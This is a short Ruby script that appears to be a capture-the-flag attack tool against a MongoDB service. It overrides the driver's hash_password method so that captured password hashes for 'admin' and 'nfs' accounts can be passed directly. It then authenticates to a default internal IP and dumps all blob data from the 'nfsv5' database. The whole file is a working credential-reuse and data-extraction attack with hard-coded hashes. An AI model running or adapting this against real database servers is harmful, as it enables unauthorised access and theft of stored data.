#!/usr/bin/env ruby
require 'mongo'

#$NONCE = '28cf33f22c110199'
#$AUTH_KEY = '6b079a01f6bb2ca4f158cbadc443fafa'

#$ZDEBUG = 1

#$HASHPWD = '92d64f9e81715a4159fad506e45a77d1'

module Mongo
  module Support
    def hash_password username, pass
#      p [username,pass]
      pass
    end
  end
end

@passes = {}
@passes['nfs'] = %w'92d64f9e81715a4159fad506e45a77d1 3a75211be980547895dac0b6b1c3ec6b'
@passes['admin']= %w'65421288ebf0922c3ffe4b3da9be5c3f'

host = ARGV.first || '10.11.77.2'

def dump host, user, db
  db = Mongo::Connection.new(host).db(db)
  @passes[user].each do |pass|
    puts "AUTH #{pass}"
    begin
      db.authenticate user, pass
      break
    rescue
      return
    end
  end

  if user=='admin'
    puts "ADMIN"
    p db.connection.db('nfsv5').collection('blobs').find().map{ |x| x['data'] }
  else
    puts "USER"
    p db.collection('blobs').find().map{ |x| x['data'] }
  end
end

dump host, "admin", "admin"
puts
dump host, "nfs",   "nfsv5"

